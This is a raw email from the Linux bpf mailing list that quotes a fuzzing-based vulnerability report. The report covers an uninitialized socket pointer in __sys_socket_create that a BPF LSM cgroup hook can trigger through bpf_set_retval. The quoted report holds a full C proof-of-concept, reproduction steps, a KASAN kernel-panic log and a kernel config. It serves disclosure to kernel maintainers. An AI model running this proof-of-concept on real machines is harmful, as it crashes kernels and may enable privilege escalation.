Received: from mail-ed1-f50.google.com (mail-ed1-f50.google.com [209.85.208.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5D4E933F8C2
	for <bpf@vger.kernel.org>; Tue, 21 Apr 2026 08:50:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.208.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776761432; cv=none; b=nlFQCIEwPdbDqubXW8E1xU4zXua00+m2YRJbvIdEDW2aBuBcn64eSmf6sDrqj1nbZHzGj0szi1aOUHgpg66sPMq4wTvj34KS1PqfJ4or+i36dGp/MfRfw0vkMnbgFUi3ohvB6GZxaWmx0xaflUmxrgeq+YAs+dzjHgSwaZa/7qM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776761432; c=relaxed/simple;
	bh=py64ELYH6f+SsCSdLPIuefC9kZpoP0WuYmb/fz8Ue1M=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=FnBtySbCf10g/rv/Tv40zr/6SgrE0Kwat34a/yP3lFUl9A5uITVKhmnfEIlDq2FPtMAffZz5u1J1+9reJ7GNhfQgbk148LS4ix1lEiLCK0CAIVSB03pY93pfI7Ji0ISAFXcrYqu6iCVv+Ua/832iPhsQQJuI8UHlG9kWvKeN8Dk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=DNSO48YB; arc=none smtp.client-ip=209.85.208.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="DNSO48YB"
Received: by mail-ed1-f50.google.com with SMTP id 4fb4d7f45d1cf-672c12e95e9so5578963a12.2
        for <bpf@vger.kernel.org>; Tue, 21 Apr 2026 01:50:20 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20251104; t=1776761419; x=1777366219; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=ix6pILmJQhnj2dnhtxRTfrGdI5n10Db+2ZJvO3Dva6A=;
        b=DNSO48YBOrQQgYxO51T0nroPKgNjNRkH9eHW0yP2/BZeY7RxasbTcgB+ip2vtMDTr+
         2xLp4asRJSrZBVSw7vllhOBxZ+XtvNSjuvrPitdCvAHQbUr1FI265GHhOQwGIDFUSMLw
         7rVf9SXoEEmnyjpFs6jh9VhQtQO3bQVxwNYiIFTzaHcaTFkTKtU4TUitwuACuuMl1Ydj
         DBu7TEn/AF1MptLjH8xprWzdxQLkEJakpWwC5SMFpfldp3sfAFkdwVujlbHLAyv3SCq5
         ohgoQyaSDmlwVpfBsNAU6Uxo7ZFicydxUejQZbKfLY/RsujuB1HGzCn+O57AZ8yN5E0O
         GH+g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1776761419; x=1777366219;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=ix6pILmJQhnj2dnhtxRTfrGdI5n10Db+2ZJvO3Dva6A=;
        b=Gx8MzKRWaj7YCQHSGUQSPCYNRZrpkc1tNSAV5bN63iBzqVKWbY6I4DFcSdZNbygBrf
         J3PZaimO6E5Dvbt8g5vzup1tjtHmOLppi6iWHap/Sqx7Esp67ybY56C3SwbDXmSY9KDX
         hLWwDqfQck7qRgtSrQT6XtA9aub5NpWbXpyDQdomqFvURXHkOAratYTWpSZV9T1hcUei
         Yd1j/eMvPbFDZkvABJPRnbFg82wz4JcpUQ88208MYcSrPXWkTlB3PwvVUph7HNTLUBrX
         SXLGhKnmnoaO9/Eb8o9Xa8U5tv8GnRzKct7nG/udFogKpnmX+6p5Vl4OyVLhiXngaetI
         Mm1A==
X-Forwarded-Encrypted: i=1; AFNElJ9lDneee8Sbu5VJwN6jKdfvRHhrMmf8XnSZu6rRx7AWbuQQBK29XGd5zVYD7N/1gNv8LVk=@vger.kernel.org
X-Gm-Message-State: AOJu0YxzNENRYBTqzWmwrhuhFIN2lath6MPsl399sisXKKEmavG7cCbQ
	c4Oefb6PYh/BRJ+pLxeFhoVX2WYl9UFGjfojDe0B52b7tx0hCUEnjU5iWgPX+/sfHw==
X-Gm-Gg: AeBDiesH0aLwekQFd0tXcNNOkORoO1LDarNrFM0NwQ67Ch7Z7Rf+jZHWq4qApAD99NO
	bGgh/s4VUfQR4b5KTs296lmANXbkJXiBZhVH+VG3yiqk67cVTeS/3M2sguqZfrTtmAPjPt95FxN
	No4O2+4B3N9hwxlkSwhrfPO6hEbhdwDLDHJdxBYWkWgktbH/lvqvHOOHZzTK5JMhLpvgtvHlary
	oS9uDw7TCmCx7oKUYtXDntbUy3uUPM/Oo41+jXQuC/EUBeTvBU8v/qFohjIthje5NYsfQRfkhh5
	vtmTCjEAadJ6RKr1xuLgVFYF9h+aMqe+0NvTyTl0fB1j5CuI+J81iVP0WGDkiP7QvvqGKegbTCT
	utywonf5QcipuNRntbSYYr8uz1y2Jp7PLk+xff3KaPbbQlOUPpFvz1okTsgZixoord/VVo6vyu4
	vMK7IBXPfBe5RdY30sy0fThuhP31j6XxHonO9CYaRFH7t70YgXgCTY5ofSqy6LnHgJt+3mWugVF
	fIl88t5e12PRrgJsQ+NjCE=
X-Received: by 2002:a17:907:26c8:b0:ba8:cad2:e001 with SMTP id a640c23a62f3a-ba8cad2e090mr252149966b.46.1776761416761;
        Tue, 21 Apr 2026 01:50:16 -0700 (PDT)
Received: from google.com (57.35.34.34.bc.googleusercontent.com. [34.34.35.57])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-ba454d1bae2sm425403866b.36.2026.04.21.01.50.15
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 21 Apr 2026 01:50:15 -0700 (PDT)
Date: Tue, 21 Apr 2026 08:50:11 +0000
From: Matt Bobrowski <mattbobrowski@google.com>
To: Quan Sun <2022090917019@std.uestc.edu.cn>
Cc: daniel@iogearbox.net, bpf@vger.kernel.org, dddddd@hust.edu.cn,
	M202472210@hust.edu.cn, dzm91@hust.edu.cn,
	hust-os-kernel-patches@googlegroups.com, edumazet@google.com,
	kuniyu@google.com, jiayuan.chen@linux.dev
Subject: Re: Uninitialized Stack Variable / NULL Pointer Dereference in
 __sys_socket_create via BPF LSM hooks
Message-ID: <aec6Q1g2K8vP_jck@google.com>
References: <567d3206-74a5-44e5-99c6-779c425f399e@std.uestc.edu.cn>
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
In-Reply-To: <567d3206-74a5-44e5-99c6-779c425f399e@std.uestc.edu.cn>

On Tue, Apr 21, 2026 at 02:32:35PM +0800, Quan Sun wrote:
> Our fuzzing found an Uninitialized Stack Variable vulnerability in the Li=
nux
> Socket Subsystem. The issue is triggered when a `BPF_PROG_TYPE_LSM` attac=
hed
> to the `bpf_lsm_socket_create` cgroup hook uses the `bpf_set_retval()`
> helper to return a value greater than 0 (e.g., `1`). This bypasses the
> actual `socket_create` execution but returns a success status back to
> `__sys_socket_create`, which then accesses the uninitialized stack variab=
le
> `sock` leading to a NULL pointer dereference or potential privilege
> escalation.
>=20
> Reported-by: Quan Sun <2022090917019@std.uestc.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
>=20
> ## Root Cause
>=20
> This vulnerability is caused by treating a manipulated return value from =
an
> LSM hook as complete success in `__sys_socket_create` without ensuring th=
at
> the underlying object has been fully initialized.
>=20
> 1. `__sys_socket_create()` in `net/socket.c` reserves a pointer variable
> `struct socket *sock;` on the kernel stack without zero-initializing it.
> 2. It calls `sock_create(family, type, protocol, &sock);` to allocate and
> initialize the socket object.
> 3. `sock_create` proceeds to allocate the socket internally and invokes t=
he
> `security_socket_create` LSM hook (which triggers `bpf_lsm_socket_create`=
).
> 4. If a BPF program is attached to the cgroup LSM hook for
> `bpf_lsm_socket_create`, it can call `bpf_set_retval(1)` and return `1`.
> 5. Because the BPF hook completes without an error code (< 0), `sock_crea=
te`
> interprets this bypass as success and promptly returns `1` (or a positive
> bypass value) back to `__sys_socket_create()`. However, the critical
> variable `sock` is never populated.
> 6. The caller `__sys_socket_create()` checks if `sock_create()`'s return
> value is `< 0`. Since `1` is not less than `0`, it assumes the `sock`
> pointer is valid.
> 7. Subsequent socket operations inside `__sys_socket_create()`, such as
> `sock_map_fd(sock, ...)`, attempt to dereference the uninitialized `sock`
> stack pointer.
>=20
> #### Execution Flow Visualization
>=20
> ```text
> Vulnerability Execution Flow
> |
> |--- 1. `__sys_socket_create(...)`
> |    |\
> |    | `-- struct socket *sock; (Uninitialized pointer on stack)
> |    |
> |--- 2. `sock_create(...)` -> `security_socket_create(...)`
> |    |\
> |    | `-- BPF LSM CGROUP hook for `bpf_lsm_socket_create` triggered.
> |    |     |
> |    |     `-- bpf_set_retval(1); return 1;
> |    |
> |--- 3. Context switches back to `sock_create`
> |    |\
> |    | `-- LSM hook returns `1`. `sock_create` skips allocation and retur=
ns
> `1`.
> |    |
> |--- 4. Context switches back to `__sys_socket_create`
> |    |\
> |    | `-- Check return value (1 < 0 is False). Treated as SUCCESS.
> |    |     |
> |    |     `-- `sock_map_fd(sock, ...)`
> |    |         |
> |    |         `-- Dereferences `sock` leading to KERNEL PANIC or Hijack.
> ```
>=20
> ## Reproduction Steps
>=20
> 1. Load a `BPF_PROG_TYPE_LSM` BPF program that:
>    - Sets the target BTF ID to `bpf_lsm_socket_create`.
>    - Calls the `bpf_set_retval(1)` helper inside the hook.
> 2. Attach the loaded program to a chosen cgroup directory using
> `BPF_LSM_CGROUP`.
> 3. Add the current process to the targeted cgroup.
> 4. Trigger the creation of a socket by invoking the `socket(AF_INET,
> SOCK_STREAM, 0)` system call from within the cgroup.
> 5. The `sock_create` function skips allocation, returns 1, and
> `__sys_socket_create` dereferences the uninitialized stack pointer.
>=20
> ## KASAN Report
>=20
> ```text
> [  214.089461][ T9899] Oops: general protection fault, probably for
> non-canonical address 0xdffffc00I
> [  214.090868][ T9899] KASAN: probably user-memory-access in range
> [0x0000000041b58ac8-0x0000000041b]
> [  214.091984][ T9899] CPU: 0 UID: 0 PID: 9899 Comm: poc Not tainted
> 7.0.0-rc5-g6f6c794d0ff0 #5 PREE
> [  214.093138][ T9899] Hardware name: QEMU Standard PC (i440FX + PIIX,
> 1996), BIOS 1.15.0-1 04/01/204
> [  214.094208][ T9899] RIP: 0010:sock_alloc_file+0x161/0x220
> [  214.094873][ T9899] Code: f8 4c 89 e0 5d 41 5c 41 5d 41 5e c3 cc cc cc=
 cc
> e8 24 71 7c f8 48 8d 7dd
> [  214.097023][ T9899] RSP: 0018:ffa000000ceb7e28 EFLAGS: 00010206
> [  214.097743][ T9899] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
> ffffffff8943ac49
> [  214.098680][ T9899] RDX: 000000000836b159 RSI: ffffffff8942fffc RDI:
> 0000000041b58acb
> [  214.099604][ T9899] RBP: 0000000041b58ab3 R08: 0000000000000000 R09:
> ffe21c000451d890
> [  214.100539][ T9899] R10: 0000000000000006 R11: 0000000000000557 R12:
> 0000000000000000
> [  214.101476][ T9899] R13: 0000000000000000 R14: 1ff40000019d6fcb R15:
> 0000000000000000
> [  214.102411][ T9899] FS:  00007f47d01f1740(0000) GS:ff110000cd71d000(00=
00)
> knlGS:0000000000000000
> [  214.103460][ T9899] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  214.104231][ T9899] CR2: 000055e55a3392a8 CR3: 0000000023790000 CR4:
> 0000000000753ef0
> [  214.105173][ T9899] PKRU: 55555554
> [  214.105595][ T9899] Call Trace:
> [  214.105991][ T9899]  <TASK>
> [  214.106358][ T9899]  __sys_socket+0x1bf/0x260
> [  214.106916][ T9899]  ? __pfx___sys_socket+0x10/0x10
> [  214.107539][ T9899]  ? ksys_write+0x1a8/0x240
> [  214.108060][ T9899]  ? __pfx_ksys_write+0x10/0x10
> [  214.108660][ T9899]  __x64_sys_socket+0x77/0xc0
> [  214.109234][ T9899]  ? lockdep_hardirqs_on+0x7c/0x110
> [  214.109864][ T9899]  do_syscall_64+0x11b/0xf80
> [  214.110423][ T9899]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [  214.111119][ T9899] RIP: 0033:0x7f47d02fed77
> [  214.111652][ T9899] Code: 73 01 c3 48 8b 0d 89 70 0c 00 f7 d8 64 89 01=
 48
> 83 c8 ff c3 66 2e 0f 1f8
> [  214.113900][ T9899] RSP: 002b:00007ffc06d983c8 EFLAGS: 00000202 ORIG_R=
AX:
> 0000000000000029
> [  214.114890][ T9899] RAX: ffffffffffffffda RBX: 00007ffc06d98668 RCX:
> 00007f47d02fed77
> [  214.115821][ T9899] RDX: 0000000000000000 RSI: 0000000000000001 RDI:
> 0000000000000002
> [  214.116761][ T9899] RBP: 00007ffc06d98550 R08: 000055e55a359000 R09:
> 0000000000021001
> [  214.117695][ T9899] R10: 00007f47d0202a68 R11: 0000000000000202 R12:
> 0000000000000000
> [  214.118624][ T9899] R13: 00007ffc06d98678 R14: 000055e51de84dd8 R15:
> 00007f47d0415020
> [  214.119563][ T9899]  </TASK>
> [  214.119925][ T9899] Modules linked in:
> [  214.120593][ T9899] ---[ end trace 0000000000000000 ]---
> [  214.121957][ T9899] RIP: 0010:sock_alloc_file+0x161/0x220
> [  214.122633][ T9899] Code: f8 4c 89 e0 5d 41 5c 41 5d 41 5e c3 cc cc cc=
 cc
> e8 24 71 7c f8 48 8d 7dd
> [  214.124903][ T9899] RSP: 0018:ffa000000ceb7e28 EFLAGS: 00010206
> [  214.125620][ T9899] RAX: dffffc0000000000 RBX: 0000000000000000 RCX:
> ffffffff8943ac49
> [  214.126549][ T9899] RDX: 000000000836b159 RSI: ffffffff8942fffc RDI:
> 0000000041b58acb
> [  214.127483][ T9899] RBP: 0000000041b58ab3 R08: 0000000000000000 R09:
> ffe21c000451d890
> [  214.129056][ T9899] R10: 0000000000000006 R11: 0000000000000557 R12:
> 0000000000000000
> [  214.130344][ T9899] R13: 0000000000000000 R14: 1ff40000019d6fcb R15:
> 0000000000000000
> [  214.131561][ T9899] FS:  00007f47d01f1740(0000) GS:ff110000cd71d000(00=
00)
> knlGS:0000000000000000
> [  214.132884][ T9899] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  214.133994][ T9899] CR2: 00007fb8b187d448 CR3: 0000000023790000 CR4:
> 0000000000753ef0
> [  214.135512][ T9899] PKRU: 55555554
> [  214.136183][ T9899] Kernel panic - not syncing: Fatal exception
> [  214.136967][ T9899] Kernel Offset: disabled
> [  214.137482][ T9899] Rebooting in 86400 seconds.
> ```
>=20
> ## Proof of Concept
>=20
> The following C program demonstrates the vulnerability on the latest
> bpf-next (commit 6f6c794d0ff05dab1fa4677f39043de8a6a80da3)
>=20
> ### How BTF_ID is obtained
>=20
> The PoC requires the `expected_id` to be the BTF id for the
> `bpf_lsm_socket_create` function from the exact running kernel image (the
> `vmlinux` used by the VM). To find this BTF ID:
>=20
> ```bash
> bpftool btf dump file /path/to/vmlinux | grep "FUNC 'bpf_lsm_socket_creat=
e'"
> ```
>=20
> Example output:
> ```text
> [XXXXX] FUNC 'bpf_lsm_socket_create' type_id=3DYYYYY linkage=3Dstatic
> ```
> The number inside the brackets `[XXXXX]` is the BTF ID that you should pa=
ss
> to the PoC or update in the source.
>=20
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <stdint.h>
> #include <unistd.h>
> #include <sys/syscall.h>
> #include <linux/bpf.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <fcntl.h>
> #include <sys/xattr.h>
>=20
> int main(int argc, char **argv) {
>     int expected_id =3D 206346; // btf_id for bpf_lsm_socket_create
>=20
>     // BPF LSM CGROUP prog returning 1 via bpf_set_retval
>     struct bpf_insn insns[] =3D {
>         { .code =3D 0xb7, .dst_reg =3D 1, .imm =3D 1 }, // r1 =3D 1
>         { .code =3D 0x85, .imm =3D 187 },             // call bpf_set_ret=
val
>         { .code =3D 0xb7, .dst_reg =3D 0, .imm =3D 1 }, // r0 =3D 1
>         { .code =3D 0x95 }                          // exit
>     };
>=20
>     union bpf_attr attr;
>     memset(&attr, 0, sizeof(attr));
>     attr.prog_type =3D 29; // BPF_PROG_TYPE_LSM
>     attr.insn_cnt =3D sizeof(insns) / sizeof(insns[0]);
>     attr.insns =3D (uint64_t)insns;
>     attr.expected_attach_type =3D 43; // BPF_LSM_CGROUP
>     attr.license =3D (uint64_t)"GPL";
>     attr.attach_btf_id =3D expected_id;
>=20
>     int prog_fd =3D syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
>=20
>     system("mkdir -p /sys/fs/cgroup/test_cg");
>     int cg_fd =3D open("/sys/fs/cgroup/test_cg", O_RDONLY | O_DIRECTORY);
>=20
>     union bpf_attr link_attr;
>     memset(&link_attr, 0, sizeof(link_attr));
>     link_attr.link_create.prog_fd =3D prog_fd;
>     link_attr.link_create.target_fd =3D cg_fd;
>     link_attr.link_create.attach_type =3D 43;
>     syscall(__NR_bpf, BPF_LINK_CREATE, &link_attr, sizeof(link_attr));
>=20
>     char pid_str[32];
>     sprintf(pid_str, "%d\n", getpid());
>     int cg_proc =3D open("/sys/fs/cgroup/test_cg/cgroup.procs", O_WRONLY);
>     write(cg_proc, pid_str, strlen(pid_str));
>     close(cg_proc);
>=20
>     printf("[*] Executing socket() to trigger uninitialized pointer
> usage\n");
>     socket(AF_INET, SOCK_STREAM, 0);
>=20
>     return 0;
> }
> ```
>=20
> ## Kernel Configuration Requirements for Reproduction
>=20
> The vulnerability can be triggered with the kernel config in the attachme=
nt.

> #
> # Automatically generated file; DO NOT EDIT.
> # Linux/x86 7.0.0-rc5 Kernel Configuration
> #
> CONFIG_CC_VERSION_TEXT=3D"gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0"
> CONFIG_CC_IS_GCC=3Dy
> CONFIG_GCC_VERSION=3D110400
> CONFIG_CLANG_VERSION=3D0
> CONFIG_AS_IS_GNU=3Dy
> CONFIG_AS_VERSION=3D23800
> CONFIG_LD_IS_BFD=3Dy
> CONFIG_LD_VERSION=3D23800
> CONFIG_LLD_VERSION=3D0
> CONFIG_RUSTC_VERSION=3D107500
> CONFIG_RUSTC_LLVM_VERSION=3D170006
> CONFIG_CC_CAN_LINK=3Dy
> CONFIG_GCC_ASM_GOTO_OUTPUT_BROKEN=3Dy
> CONFIG_TOOLS_SUPPORT_RELR=3Dy
> CONFIG_CC_HAS_ASM_INLINE=3Dy
> CONFIG_CC_HAS_NO_PROFILE_FN_ATTR=3Dy
> CONFIG_LD_CAN_USE_KEEP_IN_OVERLAY=3Dy
> CONFIG_PAHOLE_VERSION=3D125
> CONFIG_CONSTRUCTORS=3Dy
> CONFIG_IRQ_WORK=3Dy
> CONFIG_BUILDTIME_TABLE_SORT=3Dy
> CONFIG_THREAD_INFO_IN_TASK=3Dy
>=20
> #
> # General setup
> #
> CONFIG_INIT_ENV_ARG_LIMIT=3D32
> # CONFIG_COMPILE_TEST is not set
> # CONFIG_WERROR is not set
> CONFIG_LOCALVERSION=3D""
> CONFIG_LOCALVERSION_AUTO=3Dy
> CONFIG_BUILD_SALT=3D""
> CONFIG_HAVE_KERNEL_GZIP=3Dy
> CONFIG_HAVE_KERNEL_BZIP2=3Dy
> CONFIG_HAVE_KERNEL_LZMA=3Dy
> CONFIG_HAVE_KERNEL_XZ=3Dy
> CONFIG_HAVE_KERNEL_LZO=3Dy
> CONFIG_HAVE_KERNEL_LZ4=3Dy
> CONFIG_HAVE_KERNEL_ZSTD=3Dy
> CONFIG_KERNEL_GZIP=3Dy
> # CONFIG_KERNEL_BZIP2 is not set
> # CONFIG_KERNEL_LZMA is not set
> # CONFIG_KERNEL_XZ is not set
> # CONFIG_KERNEL_LZO is not set
> # CONFIG_KERNEL_LZ4 is not set
> # CONFIG_KERNEL_ZSTD is not set
> CONFIG_DEFAULT_INIT=3D""
> CONFIG_DEFAULT_HOSTNAME=3D"(none)"
> CONFIG_SYSVIPC=3Dy
> CONFIG_SYSVIPC_SYSCTL=3Dy
> CONFIG_SYSVIPC_COMPAT=3Dy
> CONFIG_POSIX_MQUEUE=3Dy
> CONFIG_POSIX_MQUEUE_SYSCTL=3Dy
> CONFIG_WATCH_QUEUE=3Dy
> CONFIG_CROSS_MEMORY_ATTACH=3Dy
> CONFIG_AUDIT=3Dy
> CONFIG_HAVE_ARCH_AUDITSYSCALL=3Dy
> CONFIG_AUDITSYSCALL=3Dy
>=20
> #
> # IRQ subsystem
> #
> CONFIG_GENERIC_IRQ_PROBE=3Dy
> CONFIG_GENERIC_IRQ_SHOW=3Dy
> CONFIG_GENERIC_IRQ_EFFECTIVE_AFF_MASK=3Dy
> CONFIG_GENERIC_PENDING_IRQ=3Dy
> CONFIG_GENERIC_IRQ_MIGRATION=3Dy
> CONFIG_HARDIRQS_SW_RESEND=3Dy
> CONFIG_IRQ_DOMAIN=3Dy
> CONFIG_IRQ_DOMAIN_HIERARCHY=3Dy
> CONFIG_GENERIC_MSI_IRQ=3Dy
> CONFIG_GENERIC_IRQ_MATRIX_ALLOCATOR=3Dy
> CONFIG_GENERIC_IRQ_RESERVATION_MODE=3Dy
> CONFIG_IRQ_FORCED_THREADING=3Dy
> CONFIG_SPARSE_IRQ=3Dy
> # CONFIG_GENERIC_IRQ_DEBUGFS is not set
> # end of IRQ subsystem
>=20
> CONFIG_CLOCKSOURCE_WATCHDOG=3Dy
> CONFIG_ARCH_CLOCKSOURCE_INIT=3Dy
> CONFIG_GENERIC_TIME_VSYSCALL=3Dy
> CONFIG_GENERIC_CLOCKEVENTS=3Dy
> CONFIG_GENERIC_CLOCKEVENTS_BROADCAST=3Dy
> CONFIG_GENERIC_CLOCKEVENTS_BROADCAST_IDLE=3Dy
> CONFIG_GENERIC_CLOCKEVENTS_MIN_ADJUST=3Dy
> CONFIG_GENERIC_CMOS_UPDATE=3Dy
> CONFIG_HAVE_POSIX_CPU_TIMERS_TASK_WORK=3Dy
> CONFIG_POSIX_CPU_TIMERS_TASK_WORK=3Dy
> CONFIG_CONTEXT_TRACKING=3Dy
> CONFIG_CONTEXT_TRACKING_IDLE=3Dy
>=20
> #
> # Timers subsystem
> #
> CONFIG_TICK_ONESHOT=3Dy
> CONFIG_NO_HZ_COMMON=3Dy
> # CONFIG_HZ_PERIODIC is not set
> CONFIG_NO_HZ_IDLE=3Dy
> # CONFIG_NO_HZ_FULL is not set
> CONFIG_CONTEXT_TRACKING_USER=3Dy
> # CONFIG_CONTEXT_TRACKING_USER_FORCE is not set
> CONFIG_NO_HZ=3Dy
> CONFIG_HIGH_RES_TIMERS=3Dy
> CONFIG_CLOCKSOURCE_WATCHDOG_MAX_SKEW_US=3D125
> # CONFIG_POSIX_AUX_CLOCKS is not set
> # end of Timers subsystem
>=20
> CONFIG_BPF=3Dy
> CONFIG_HAVE_EBPF_JIT=3Dy
> CONFIG_ARCH_WANT_DEFAULT_BPF_JIT=3Dy
>=20
> #
> # BPF subsystem
> #
> CONFIG_BPF_SYSCALL=3Dy
> CONFIG_BPF_JIT=3Dy
> CONFIG_BPF_JIT_ALWAYS_ON=3Dy
> CONFIG_BPF_JIT_DEFAULT_ON=3Dy
> # CONFIG_BPF_UNPRIV_DEFAULT_OFF is not set
> CONFIG_BPF_PRELOAD=3Dy
> CONFIG_BPF_PRELOAD_UMD=3Dy
> CONFIG_BPF_LSM=3Dy
> # end of BPF subsystem
>=20
> CONFIG_PREEMPT_BUILD=3Dy
> CONFIG_ARCH_HAS_PREEMPT_LAZY=3Dy
> CONFIG_PREEMPT=3Dy
> # CONFIG_PREEMPT_LAZY is not set
> # CONFIG_PREEMPT_RT is not set
> CONFIG_PREEMPT_COUNT=3Dy
> CONFIG_PREEMPTION=3Dy
> CONFIG_PREEMPT_DYNAMIC=3Dy
> CONFIG_SCHED_CORE=3Dy
> # CONFIG_SCHED_CLASS_EXT is not set
>=20
> #
> # CPU/Task time and stats accounting
> #
> CONFIG_VIRT_CPU_ACCOUNTING=3Dy
> # CONFIG_TICK_CPU_ACCOUNTING is not set
> CONFIG_VIRT_CPU_ACCOUNTING_GEN=3Dy
> CONFIG_IRQ_TIME_ACCOUNTING=3Dy
> CONFIG_HAVE_SCHED_AVG_IRQ=3Dy
> CONFIG_BSD_PROCESS_ACCT=3Dy
> CONFIG_BSD_PROCESS_ACCT_V3=3Dy
> CONFIG_TASKSTATS=3Dy
> CONFIG_TASK_DELAY_ACCT=3Dy
> CONFIG_TASK_XACCT=3Dy
> CONFIG_TASK_IO_ACCOUNTING=3Dy
> CONFIG_PSI=3Dy
> # CONFIG_PSI_DEFAULT_DISABLED is not set
> # end of CPU/Task time and stats accounting
>=20
> CONFIG_CPU_ISOLATION=3Dy
>=20
> #
> # RCU Subsystem
> #
> CONFIG_TREE_RCU=3Dy
> CONFIG_PREEMPT_RCU=3Dy
> # CONFIG_RCU_EXPERT is not set
> CONFIG_TREE_SRCU=3Dy
> CONFIG_TASKS_RCU_GENERIC=3Dy
> CONFIG_NEED_TASKS_RCU=3Dy
> CONFIG_TASKS_RCU=3Dy
> CONFIG_TASKS_RUDE_RCU=3Dy
> CONFIG_TASKS_TRACE_RCU=3Dy
> CONFIG_RCU_STALL_COMMON=3Dy
> CONFIG_RCU_NEED_SEGCBLIST=3Dy
> # end of RCU Subsystem
>=20
> CONFIG_IKCONFIG=3Dy
> CONFIG_IKCONFIG_PROC=3Dy
> # CONFIG_IKHEADERS is not set
> CONFIG_LOG_BUF_SHIFT=3D18
> CONFIG_LOG_CPU_MAX_BUF_SHIFT=3D12
> # CONFIG_PRINTK_INDEX is not set
> CONFIG_HAVE_UNSTABLE_SCHED_CLOCK=3Dy
>=20
> #
> # Scheduler features
> #
> # CONFIG_UCLAMP_TASK is not set
> # CONFIG_SCHED_PROXY_EXEC is not set
> # end of Scheduler features
>=20
> CONFIG_ARCH_SUPPORTS_NUMA_BALANCING=3Dy
> CONFIG_ARCH_WANT_BATCHED_UNMAP_TLB_FLUSH=3Dy
> CONFIG_CC_HAS_INT128=3Dy
> CONFIG_CC_IMPLICIT_FALLTHROUGH=3D"-Wimplicit-fallthrough=3D5"
> CONFIG_GCC10_NO_ARRAY_BOUNDS=3Dy
> CONFIG_CC_NO_ARRAY_BOUNDS=3Dy
> CONFIG_GCC_NO_STRINGOP_OVERFLOW=3Dy
> CONFIG_CC_NO_STRINGOP_OVERFLOW=3Dy
> CONFIG_ARCH_SUPPORTS_INT128=3Dy
> CONFIG_NUMA_BALANCING=3Dy
> CONFIG_NUMA_BALANCING_DEFAULT_ENABLED=3Dy
> CONFIG_SLAB_OBJ_EXT=3Dy
> CONFIG_CGROUPS=3Dy
> CONFIG_PAGE_COUNTER=3Dy
> # CONFIG_CGROUP_FAVOR_DYNMODS is not set
> CONFIG_MEMCG=3Dy
> CONFIG_MEMCG_V1=3Dy
> CONFIG_BLK_CGROUP=3Dy
> CONFIG_CGROUP_WRITEBACK=3Dy
> CONFIG_CGROUP_SCHED=3Dy
> CONFIG_GROUP_SCHED_WEIGHT=3Dy
> CONFIG_GROUP_SCHED_BANDWIDTH=3Dy
> CONFIG_FAIR_GROUP_SCHED=3Dy
> CONFIG_CFS_BANDWIDTH=3Dy
> # CONFIG_RT_GROUP_SCHED is not set
> CONFIG_SCHED_MM_CID=3Dy
> CONFIG_CGROUP_PIDS=3Dy
> CONFIG_CGROUP_RDMA=3Dy
> # CONFIG_CGROUP_DMEM is not set
> CONFIG_CGROUP_FREEZER=3Dy
> CONFIG_CGROUP_HUGETLB=3Dy
> CONFIG_CPUSETS=3Dy
> # CONFIG_CPUSETS_V1 is not set
> CONFIG_CGROUP_DEVICE=3Dy
> CONFIG_CGROUP_CPUACCT=3Dy
> CONFIG_CGROUP_PERF=3Dy
> CONFIG_CGROUP_BPF=3Dy
> CONFIG_CGROUP_MISC=3Dy
> CONFIG_CGROUP_DEBUG=3Dy
> CONFIG_SOCK_CGROUP_DATA=3Dy
> CONFIG_NAMESPACES=3Dy
> CONFIG_UTS_NS=3Dy
> CONFIG_TIME_NS=3Dy
> CONFIG_IPC_NS=3Dy
> CONFIG_USER_NS=3Dy
> CONFIG_PID_NS=3Dy
> CONFIG_NET_NS=3Dy
> CONFIG_CHECKPOINT_RESTORE=3Dy
> # CONFIG_SCHED_AUTOGROUP is not set
> CONFIG_RELAY=3Dy
> CONFIG_BLK_DEV_INITRD=3Dy
> CONFIG_INITRAMFS_SOURCE=3D""
